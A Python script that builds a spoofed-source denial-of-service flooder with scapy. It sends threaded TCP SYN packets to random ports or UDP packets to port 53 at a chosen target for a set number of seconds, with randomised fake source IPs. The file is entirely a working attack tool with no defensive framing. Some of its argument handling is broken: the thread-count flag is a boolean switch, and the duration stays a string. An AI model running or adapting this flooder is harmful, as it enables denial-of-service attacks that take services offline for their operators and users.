import argparse
import ipaddress
from scapy import all as scapy
from scapy.all import send
import concurrent.futures
import random
import time
import string

def spoof_ip():
    return str(random.randint(1,255)) + "." + str(random.randint(1,255)) + "." + str(random.randint(1,255)) + "." + str(random.randint(1,255))

def spoof_mac():
    mac = ''
    chars = 'abcdef0123456789'
    for x in range(6): 
        mac = mac + random.choice(chars) + random.choice(chars) + ':'
    return mac[:-1]

def parallel_floodTCPSYN(target , duration, threads):
    syn_pkt = scapy.IP(dst=target, src=spoof_ip())/scapy.TCP(dport=random.randint(1,65535), flags="S") # port 80 by default
    send(syn_pkt,verbose=0)
    pass

def parallel_floodUDP(target, duration, threads): 
    udp = scapy.IP(dst=target, src=spoof_ip())/scapy.UDP(dport=53) # I find that 53 works the best 
    send(udp)
    pass

def spawn_threads(target, seconds, threads, proto): 
    if proto == 'TCPSYN':
        start_time = time.time()
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            while time.time() - start_time < seconds:
                executor.submit(parallel_floodTCPSYN, target, seconds, threads)
    elif proto == 'UDP':
        start_time = time.time()
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            while time.time() - start_time < seconds:
                executor.submit(parallel_floodUDP, target, seconds, threads)
   
            

def parse_arguments():
    parser = argparse.ArgumentParser(description="Volumetric Flood Script using UDP/TCP SYN")
    parser.add_argument('-t', '--target', help='Set target', required=True)
    parser.add_argument('-T', '--threads', action='store_true', help='Set number of threads (Default:100)', default=100)
    parser.add_argument('-f', '--flood-type', help='Flood type options: UDP, TCPSYN ', required=True)
    parser.add_argument('-s', '--time', help='Duration of flood in seconds', default=60)
    return parser.parse_args()
    
def main():
    args            = parse_arguments()
    target          = args.target
    threads         = args.threads
    flood_type      = args.flood_type
    seconds         = args.time
    print(spoof_ip())
    print(spoof_mac())
    if flood_type in ['UDP', 'TCPSYN']:
        spawn_threads(target, seconds, threads, flood_type)

main()